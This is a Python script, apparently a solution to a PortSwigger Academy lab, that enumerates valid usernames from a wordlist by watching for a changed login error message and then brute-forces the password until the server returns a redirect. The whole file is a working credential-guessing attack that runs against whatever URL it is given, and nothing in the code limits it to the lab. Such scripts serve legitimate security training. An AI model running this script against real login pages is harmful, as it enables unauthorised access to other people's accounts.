#Only for compleating Portswigger Academy Challange
#Author: zemler
#https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

import requests
import sys


if __name__ == "__main__":
    url = sys.argv[1]
    
    username_error = "Invalid username"
    
    with open('users.txt', 'r') as userfile:
        user = userfile.readline().strip()
        while user:
            parameters = {"username": user, "password":"aaa"}
            print(f"[*]Trying username {user}")
            r = requests.post(f"{url}login", data=parameters)
            if username_error not in r.text:
                print(f"[+] Found Valid username: {user}")
                break
            user = userfile.readline().strip()
    correct_user = user
    
    with open('passwords.txt', 'r') as passwords:
        password = passwords.readline().strip()
        while password:
            parameters = {"username": correct_user, "password": password}
            print(f"[*]Trying Password {password}")
            r = requests.post(f"{url}login", data=parameters, allow_redirects=False)
            if r.status_code == 302:
                print(f"[+]Password is: {password}")
                print(f"[+]Valid Username {correct_user} Valid Password {password}")
                break
            password = passwords.readline().strip()
        
    